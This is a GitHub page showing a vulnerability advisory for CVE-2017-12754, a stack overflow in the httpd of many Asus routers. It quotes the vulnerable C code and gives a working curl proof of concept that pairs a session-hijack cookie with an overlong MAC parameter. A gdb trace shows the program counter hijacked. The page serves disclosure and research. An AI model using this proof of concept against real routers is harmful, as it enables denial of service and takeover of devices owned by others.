=== Content from github.com_11ccffc0_20250125_123852.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcoincoin7%2FWireless-Router-Vulnerability%2Fblob%2Fmaster%2FAsus_DeleteOfflineClientOverflow.txt)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcoincoin7%2FWireless-Router-Vulnerability%2Fblob%2Fmaster%2FAsus_DeleteOfflineClientOverflow.txt)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=coincoin7%2FWireless-Router-Vulnerability)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[coincoin7](/coincoin7)
/
**[Wireless-Router-Vulnerability](/coincoin7/Wireless-Router-Vulnerability)**
Public

* [Notifications](/login?return_to=%2Fcoincoin7%2FWireless-Router-Vulnerability) You must be signed in to change notification settings
* [Fork
  23](/login?return_to=%2Fcoincoin7%2FWireless-Router-Vulnerability)
* [Star
   91](/login?return_to=%2Fcoincoin7%2FWireless-Router-Vulnerability)

* [Code](/coincoin7/Wireless-Router-Vulnerability)
* [Issues
  1](/coincoin7/Wireless-Router-Vulnerability/issues)
* [Pull requests
  0](/coincoin7/Wireless-Router-Vulnerability/pulls)
* [Actions](/coincoin7/Wireless-Router-Vulnerability/actions)
* [Projects
  0](/coincoin7/Wireless-Router-Vulnerability/projects)
* [Security](/coincoin7/Wireless-Router-Vulnerability/security)
* [Insights](/coincoin7/Wireless-Router-Vulnerability/pulse)

Additional navigation options

* [Code](/coincoin7/Wireless-Router-Vulnerability)
* [Issues](/coincoin7/Wireless-Router-Vulnerability/issues)
* [Pull requests](/coincoin7/Wireless-Router-Vulnerability/pulls)
* [Actions](/coincoin7/Wireless-Router-Vulnerability/actions)
* [Projects](/coincoin7/Wireless-Router-Vulnerability/projects)
* [Security](/coincoin7/Wireless-Router-Vulnerability/security)
* [Insights](/coincoin7/Wireless-Router-Vulnerability/pulse)

## Files

 master
## Breadcrumbs

1. [Wireless-Router-Vulnerability](/coincoin7/Wireless-Router-Vulnerability/tree/master)
/
# Asus\_DeleteOfflineClientOverflow.txt

Copy path Blame  Blame
## Latest commit

## History

[History](/coincoin7/Wireless-Router-Vulnerability/commits/master/Asus_DeleteOfflineClientOverflow.txt)163 lines (143 loc) · 7.12 KB master
## Breadcrumbs

1. [Wireless-Router-Vulnerability](/coincoin7/Wireless-Router-Vulnerability/tree/master)
/
# Asus\_DeleteOfflineClientOverflow.txt

Top
## File metadata and controls

* Code
* Blame

163 lines (143 loc) · 7.12 KB[Raw](https://github.com/coincoin7/Wireless-Router-Vulnerability/raw/refs/heads/master/Asus_DeleteOfflineClientOverflow.txt)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163CVE-2017-12754
[Vulnerability]:Stack buffer overflow in httpd
------------------------------------------[Exploitation]:Can control the $pc.Use together with a session hijack vulnerability or in a csrf attack,can remote code execution and then get a connectback shell.
------------------------------------------[Vendor of Product]:Asus wireless router
------------------------------------------[Affected Products and firmware version]:Asuswrt-Merlin ,all the firmware and the latest firmware is 380.67\_0RT-AC5300 ,all the firmware,include the last and before.RT\_AC1900P ,all the firmware,include the last and before.RT-AC68U ,all the firmware,include the last and before.RT-AC68P ,all the firmware,include the last and before.RT-AC88U ,all the firmware,include the last and before.RT-AC66U ,all the firmware,include the last and before.RT-AC66U\_B1 ,all the firmware,include the last and before.RT-AC58U ,all the firmware,include the last and before.RT-AC56U ,all the firmware,include the last and before.RT-AC55U ,all the firmware,include the last and before.RT-AC52U ,all the firmware,include the last and before.RT-AC51U ,all the firmware,include the last and before.RT-N18U ,all the firmware,include the last and before.RT-N66U ,all the firmware,include the last and before.RT-N56U ,all the firmware,include the last and before.RT-AC3200 ,all the firmware,include the last and before.RT-AC3100 ,all the firmware,include the last and before.RT\_AC1200GU ,all the firmware,include the last and before.RT\_AC1200G ,all the firmware,include the last and before.RT-AC1200 ,all the firmware,include the last and before.RT-AC53 ,all the firmware,include the last and before.RT-N12HP ,all the firmware,include the last and before.RT-N12HP\_B1 ,all the firmware,include the last and before.RT-N12D1 ,all the firmware,include the last and before.RT-N12+ ,all the firmware,include the last and before.RT\_N12+\_PRO ,all the firmware,include the last and before.RT-N16 ,all the firmware,include the last and before.RT-N300 ,all the firmware,include the last and before.
------------------------------------------[Attack Type]:Remote
------------------------------------------[Can Cause Denial of Service?]:yes
------------------------------------------[Reference]:https://github.com/RMerl/asuswrt-merlin/blob/master/release/src/router/httpd/web.c#L9277,L9289http://asuswrt.lostrealm.ca/https://www.asus.com/Networking/RTN12HP\_B1/HelpDesk\_Download/ (chose the others can download the firmware sourcecode)https://www.asus.com/Networking/Wireless-Routers-Products/
------------------------------------------[Discoverer]:Tianfeng Guan, pkav of Sichuan Silent Information Technology Company Ltd, http://www.silence.com.cn/
------------------------------------------[Affected components]:Affected executable application: httpdAffected source code file: \release\src\router\httpd\web.cAffected function: deleteOfflineClient(webs\_t wp, char\_t \*urlPrefix, char\_t \*webDir, int arg, char\_t \*url, char\_t \*path, char\_t \*query)
------------------------------------------[Vulnerability details]:When accessing the deleteOfflineClient.cgi of the web manager(httpd),the httpd will call the function deleteOfflineClient()to parses the url which in http GET request,and it will use function websGetVar() to get the value of the parameter delete\_offline\_client in the url. but, when saving the delete\_offline\_client to the stack buffer char mac\_str[13],it doesn't limit the the length of the parameter delete\_offline\_client,so the stack buffer mac\_str[13] will be overflow and this stack-based overflow can be used to gain control over httpd's control flow by overwriting the saved $ra stored on the stack.
deleteOfflineClient(webs\_t wp, char\_t \*urlPrefix, char\_t \*webDir, int arg, char\_t \*url, char\_t \*path, char\_t \*query){ char \*mac = NULL; char mac\_str[13]; mac = websGetVar(wp, "delete\_offline\_client",""); ...... ...... i = 0; while(\*mac) { if(\*mac==':') { mac++; continue; } else { mac\_str[i] = tolower(\*mac); i++; mac++; } } if(i!=12) return; ......}
------------------------------------------[Exploitation details]:Because access to the deleteOfflineClient.cgi page requires web authentication,so it needs a session hijack vulnerability or acsrf attack to get access permissions for the deleteOfflineClient.cgi at first. And then, we can use this vulnerability to controlthe httpd's control flow $pc by overwriting the saved $ra stored on the stack.For example, we can send a http get request like: GET /deleteOfflineClient.cgi?delete\_offline\_client=aa:aa:aa:aa:aa:aa:aa:aa:aa:aa:aa:aa:aa:aa:33:3 HTTP/1.1And the httpd's control flow $pc will be set to 0x00333333.
------------------------------------------[POC]:# Tested product and firmware version: RT-N12HP\_B1 (3.0.0.4.380.3479)# With the help of CVE-2017-6549(Session hijack), this POC can exploit this vulnerability to control the $pc
curl -H 'User-Agent: asusrouter-Windows-IFTTT-1.0' -H 'Cookie: asus\_token=cgi\_logout' http://192.168.2.1/deleteOfflineClient.cgi?delete\_offline\_client=aa:aa:aa:aa:aa:aa:aa:aa:aa:aa:aa:aa:aa:aa:33:3
------------------------------------------[Gdb trace]:admin@RT-N12HP\_B1:/tmp/bin# ./gdb httpd $(pidof httpd)
dlopen failed on 'libthread\_db.so.1' - File not foundGDB will not be able to debug pthreads.
GNU gdb 6.8Copyright (C) 2008 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type "show copying"and "show warranty" for details.This GDB was configured as "mipsel-linux"...I'm sorry, Dave, I can't do that. Symbol format `elf32-tradlittlemips' unknown.Attaching to program: /usr/sbin/httpd, process 6510x2ad8d05c in ?? () from /lib/libc.so.0(gdb) cContinuing.
Program received signal SIGSEGV, Segmentation fault.0x00333333 in ?? ()(gdb) i r zero at v0 v1 a0 a1 a2 a3 R0 00000000 00000001 0000000c 00000000 004570ae 2adb90d0 0000001f 7fd973ff  t0 t1 t2 t3 t4 t5 t6 t7 R8 2adb90d0 7fd973e0 00000000 7fd970f0 2adb9f38 2adcc124 6172500a 3a616d67  s0 s1 s2 s3 s4 s5 s6 s7 R16 61616161 61616161 61616161 00000004 00446f4c 00000000 00446428 00498158  t8 t9 k0 k1 gp sp s8 ra R24 00000000 2ad9f7d0 2adcfa70 00000000 0044e8d0 7fd97400 00440000 00333333  status lo hi badvaddr cause pc 01009c13 11288d57 00000001 00333332 00000008 00333333  fcsr fir restart 00800000 00000000 00000000 (gdb) cContinuing.
Program terminated with signal SIGSEGV, Segmentation fault.The program no longer exists.
As we have seen, the registers ra and pc are overwritten by 0x00333333.Finally, with the ROP can lead to Remote Command Execution.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


